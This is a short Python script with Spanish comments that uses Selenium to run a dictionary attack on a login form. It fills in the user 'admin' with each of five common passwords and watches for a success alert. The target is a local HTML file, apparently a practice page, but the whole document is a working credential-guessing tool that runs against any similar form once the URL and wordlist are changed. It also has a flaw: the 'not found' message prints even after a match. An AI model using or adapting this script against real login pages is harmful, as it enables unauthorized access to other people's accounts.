from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Configurar el navegador (asegúrate de instalar selenium y chromedriver)
driver = webdriver.Chrome()

# Abrir la página de inicio de sesión
driver.get("file:///C:/ruta/del/archivo.html")  # Cambia por la ruta de tu archivo HTML

# Lista de posibles contraseñas
diccionario = ["123456", "password", "clave123", "admin", "qwerty"]

# Intentar cada contraseña
for password in diccionario:
    usuario_input = driver.find_element(By.ID, "usuario")
    password_input = driver.find_element(By.ID, "password")
    login_button = driver.find_element(By.TAG_NAME, "button")

    usuario_input.clear()
    password_input.clear()

    usuario_input.send_keys("admin")  # Usuario fijo
    password_input.send_keys(password)
    login_button.click()

    time.sleep(1)  # Esperar para ver el resultado

    # Si aparece la alerta de éxito, se encontró la contraseña
    try:
        alert = driver.switch_to.alert
        if "exitoso" in alert.text:
            print(f"✅ Contraseña encontrada: {password}")
            alert.accept()
            break
        alert.accept()
    except:
        pass

print("❌ No se encontró la contraseña en el diccionario.")
driver.quit()
